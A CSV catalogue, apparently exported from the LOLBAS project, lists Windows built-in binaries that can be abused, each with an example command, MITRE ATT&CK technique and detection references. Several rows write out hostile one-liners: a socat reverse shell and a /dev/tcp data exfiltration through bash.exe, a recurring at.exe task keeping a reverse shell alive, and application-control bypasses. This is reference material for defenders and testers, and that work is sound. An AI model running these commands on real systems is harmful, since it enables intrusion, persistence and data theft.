Filename,Description,Author,Date,Command,Command Description,Command Usecase,Command Category,Command Privileges,MITRE ATT&CK technique,Operating System,Paths,Detections,Resources,Acknowledgements,URL
"AppInstaller.exe","Tool used for installation of AppX/MSIX applications on Windows 10","Wade Hickey","2020-12-02","start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw","AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache\<RANDOM-8-CHAR-DIRECTORY>","Download file from Internet","Download","User","T1105","Windows 10, Windows 11","C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/bdb00f403fd8ede0daa04449ad913200af9466ff/rules/windows/dns_query/win_dq_lobas_appinstaller.yml","https://twitter.com/notwhickey/status/1333900137232523264","Wade Hickey (@notwhickey)","http://localhost:4001/lolbas/Binaries/AppInstaller/"
"Aspnet_Compiler.exe","ASP.NET Compilation Tool","Jimmy (@bohops)","2021-09-26","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u","Execute C# code with the Build Provider and proper folder structure in place.","Execute proxied payload with Microsoft signed binary to bypass application control solutions","AWL Bypass","User","T1127","Windows 10, Windows 11","c:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe, c:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe","BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, Sigma: https://github.com/SigmaHQ/sigma/blob/960a03eaf480926ed8db464477335a713e9e6630/rules/windows/process_creation/win_pc_lobas_aspnet_compiler.yml","https://ijustwannared.team/2020/08/01/the-curious-case-of-aspnet_compiler-exe/, https://docs.microsoft.com/en-us/dotnet/api/system.web.compilation.buildprovider.generatecode?view=netframework-4.8","cpl (@cpl3h)","http://localhost:4001/lolbas/Binaries/Aspnet_Compiler/"
"At.exe","Schedule periodic tasks","Freddie Barr-Smith","2019-09-20","C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su C:\Windows\System32\revshell.exe","Create a recurring task to execute every day at a specific time.","Create a recurring task, to eg. to keep reverse shell session(s) alive","Execute","Local Admin","T1053.002","Windows 7 or older","C:\WINDOWS\System32\At.exe, C:\WINDOWS\SysWOW64\At.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_interactive_at.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/network/zeek/zeek_smb_converted_win_atsvc_task.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/builtin/win_atsvc_task.yml, IOC: C:\Windows\System32\Tasks\At1 (substitute 1 with subsequent number of at job), IOC: C:\Windows\Tasks\At1.job, IOC: Registry Key - Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\At1.","https://freddiebarrsmith.com/at.txt, https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html, https://www.secureworks.com/blog/where-you-at-indicators-of-lateral-movement-using-at-exe-on-windows-7-systems","Freddie Barr-Smith, Riccardo Spolaor, Mariano Graziano, Xabier Ugarte-Pedrero","http://localhost:4001/lolbas/Binaries/At/"
"Atbroker.exe","Helper binary for Assistive Technology (AT)","Oddvar Moe","2018-05-25","ATBroker.exe /start malware","Start a registered Assistive Technology (AT).","Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry.","Execute","User","T1218","Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\Atbroker.exe, C:\Windows\SysWOW64\Atbroker.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/eb406ba36fc607986970c09e53058af412093647/rules/windows/process_creation/win_susp_atbroker.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/7bca85e40618126643b9712b80bd663c21908e26/rules/windows/registry_event/sysmon_susp_atbroker_change.yml, IOC: Changes to HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\Configuration, IOC: Changes to HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs, IOC: Unknown AT starting C:\Windows\System32\ATBroker.exe /start malware","http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/","Adam (@hexacorn)","http://localhost:4001/lolbas/Binaries/Atbroker/"
"Bash.exe","File used by Windows subsystem for Linux","Oddvar Moe","2018-05-25","bash.exe -c calc.exe","Executes calc.exe from bash.exe","Performs execution of specified file, can be used as a defensive evasion.","Execute","User","T1202","Windows 10","C:\Windows\System32\bash.exe, C:\Windows\SysWOW64\bash.exe","BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, Sigma: https://github.com/SigmaHQ/sigma/blob/960a03eaf480926ed8db464477335a713e9e6630/rules/windows/process_creation/win_pc_lobas_bash.yml, IOC: Child process from bash.exe","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules","Alex Ionescu (@aionescu), Asif Matadar (@d1r4c)","http://localhost:4001/lolbas/Binaries/Bash/"
"Bash.exe","File used by Windows subsystem for Linux","Oddvar Moe","2018-05-25","bash.exe -c ""socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane""","Executes a reverseshell","Performs execution of specified file, can be used as a defensive evasion.","Execute","User","T1202","Windows 10","C:\Windows\System32\bash.exe, C:\Windows\SysWOW64\bash.exe","BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, Sigma: https://github.com/SigmaHQ/sigma/blob/960a03eaf480926ed8db464477335a713e9e6630/rules/windows/process_creation/win_pc_lobas_bash.yml, IOC: Child process from bash.exe","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules","Alex Ionescu (@aionescu), Asif Matadar (@d1r4c)","http://localhost:4001/lolbas/Binaries/Bash/"
"Bash.exe","File used by Windows subsystem for Linux","Oddvar Moe","2018-05-25","bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'","Exfiltrate data","Performs execution of specified file, can be used as a defensive evasion.","Execute","User","T1202","Windows 10","C:\Windows\System32\bash.exe, C:\Windows\SysWOW64\bash.exe","BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, Sigma: https://github.com/SigmaHQ/sigma/blob/960a03eaf480926ed8db464477335a713e9e6630/rules/windows/process_creation/win_pc_lobas_bash.yml, IOC: Child process from bash.exe","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules","Alex Ionescu (@aionescu), Asif Matadar (@d1r4c)","http://localhost:4001/lolbas/Binaries/Bash/"
"Bash.exe","File used by Windows subsystem for Linux","Oddvar Moe","2018-05-25","bash.exe -c calc.exe","Executes calc.exe from bash.exe","Performs execution of specified file, can be used to bypass Application Whitelisting.","AWL Bypass","User","T1202","Windows 10","C:\Windows\System32\bash.exe, C:\Windows\SysWOW64\bash.exe","BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, Sigma: https://github.com/SigmaHQ/sigma/blob/960a03eaf480926ed8db464477335a713e9e6630/rules/windows/process_creation/win_pc_lobas_bash.yml, IOC: Child process from bash.exe","https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules","Alex Ionescu (@aionescu), Asif Matadar (@d1r4c)","http://localhost:4001/lolbas/Binaries/Bash/"
"Bitsadmin.exe","Used for managing background intelligent transfer","Oddvar Moe","2018-05-25","bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1","Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.","Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.","ADS","User","T1564.004","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\bitsadmin.exe, C:\Windows\SysWOW64\bitsadmin.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/90ca1a8ad2e5c96d09a9ae4ff92483a2110d49ff/rules/windows/process_creation/win_process_creation_bitsadmin_download.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/abcaf00aeef3769aa2a6f66f7fb6537b867c1691/rules/proxy/proxy_ua_bitsadmin_susp_tld.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/e40b8592544721c689f8ae96477ea1218e4c7a05/rules/windows/process_creation/win_monitoring_for_persistence_via_bits.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/bitsadmin_download_file.yml, IOC: Child process from bitsadmin.exe, IOC: bitsadmin creates new files, IOC: bitsadmin adds data to alternate data stream","https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679, https://www.youtube.com/watch?v=_8xJaaQlpBo, https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f","Rob Fuller (@mubix), Chris Gates (@carnal0wnage), Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Bitsadmin/"
"Bitsadmin.exe","Used for managing background intelligent transfer","Oddvar Moe","2018-05-25","bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1","Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.","Download file from Internet","Download","User","T1105","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\bitsadmin.exe, C:\Windows\SysWOW64\bitsadmin.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/90ca1a8ad2e5c96d09a9ae4ff92483a2110d49ff/rules/windows/process_creation/win_process_creation_bitsadmin_download.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/abcaf00aeef3769aa2a6f66f7fb6537b867c1691/rules/proxy/proxy_ua_bitsadmin_susp_tld.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/e40b8592544721c689f8ae96477ea1218e4c7a05/rules/windows/process_creation/win_monitoring_for_persistence_via_bits.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/bitsadmin_download_file.yml, IOC: Child process from bitsadmin.exe, IOC: bitsadmin creates new files, IOC: bitsadmin adds data to alternate data stream","https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679, https://www.youtube.com/watch?v=_8xJaaQlpBo, https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f","Rob Fuller (@mubix), Chris Gates (@carnal0wnage), Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Bitsadmin/"
